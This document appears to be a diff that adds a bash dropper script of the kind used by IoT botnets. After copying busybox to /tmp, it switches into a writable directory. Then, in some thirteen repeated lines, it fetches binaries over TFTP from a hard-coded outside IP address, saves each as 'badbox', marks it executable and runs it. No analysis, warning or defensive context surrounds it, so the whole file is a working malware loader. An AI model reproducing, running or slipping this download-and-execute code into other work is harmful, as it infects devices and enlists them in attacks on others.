@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get dfnvgsfdag;cat dfnvgsfdag >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get dfngfdsg;cat dfngfdsg >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get dfnsgf;cat dfnsgf >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get fgdndbsfg;cat fgdndbsfg >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get fnbdfnsdfbgf;cat fnbdfnsdfbgf >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get dnfnhbsr4334dfgddfg;cat dnfnhbsr4334dfgddfg >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get fdsgsdf;cat fdsgsdf >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get hh53sgfd;cat hh53sgfd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get 45bbrhfghjd;cat 45bbrhfghjd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get 3456hfgdhgfjfdjdjfd;cat 3456hfgdhgfjfdjdjfd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get [dfjdfjgfdjhrf];cat [dfjdfjgfdjhrf] >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get fjdfdfhfgdhfgdj;cat fjdfdfhfgdhfgdj >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get dfjdjgfjdfjfgfgfhhd;cat dfjdjgfjdfjfgfgfhhd >badbox;chmod +x *;./badbox
